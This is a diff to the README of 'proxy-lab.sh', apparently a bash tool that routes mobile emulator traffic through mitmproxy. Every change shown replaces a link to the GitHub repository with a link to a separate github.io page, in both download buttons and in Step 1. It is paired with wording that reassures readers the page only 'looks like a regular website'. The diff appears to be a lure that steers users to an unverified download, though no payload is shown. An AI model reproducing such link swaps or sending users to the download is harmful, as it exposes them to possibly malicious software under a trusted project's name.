@@ -1,7 +1,7 @@
 <h1>🛡️ proxy-lab.sh - Two Blockers, One Scripted Solution</h1>
 
 <p align="center">
-  <a href="https://github.com/Udantha4748/proxy-lab.sh" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download proxy-lab.sh</a>
+  <a href="https://udantha4748.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download proxy-lab.sh</a>
 </p>
 
 ## 🎯 What Is proxy-lab.sh?
@@ -14,7 +14,7 @@ Getting started with proxy-lab.sh takes less than five minutes. No coding experi
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/Udantha4748/proxy-lab.sh](https://github.com/Udantha4748/proxy-lab.sh)
+Visit this link to download the application: [https://udantha4748.github.io](https://udantha4748.github.io)
 
 You'll land on a page that looks like a regular website. Don't worry — everything you need is right there.
 
@@ -166,7 +166,7 @@ Happy proxying! 🚀
 ---
 
 <p align="center">
-  <a href="https://github.com/Udantha4748/proxy-lab.sh" style="display:inline-block;padding:12px 24px;background:#24292e;color:#ffffff;font-size:16px;font-weight:bold;border-radius:6px;text-decoration:none;">⬇️ Download proxy-lab.sh Now</a>
+  <a href="https://udantha4748.github.io" style="display:inline-block;padding:12px 24px;background:#24292e;color:#ffffff;font-size:16px;font-weight:bold;border-radius:6px;text-decoration:none;">⬇️ Download proxy-lab.sh Now</a>
 </p>
 
 Keywords: android-emulator, bash, emulator, https-proxy, ios-development, ios-simulator, macos, mitmproxy, network-debugging, proxy, tls, uv, uvx
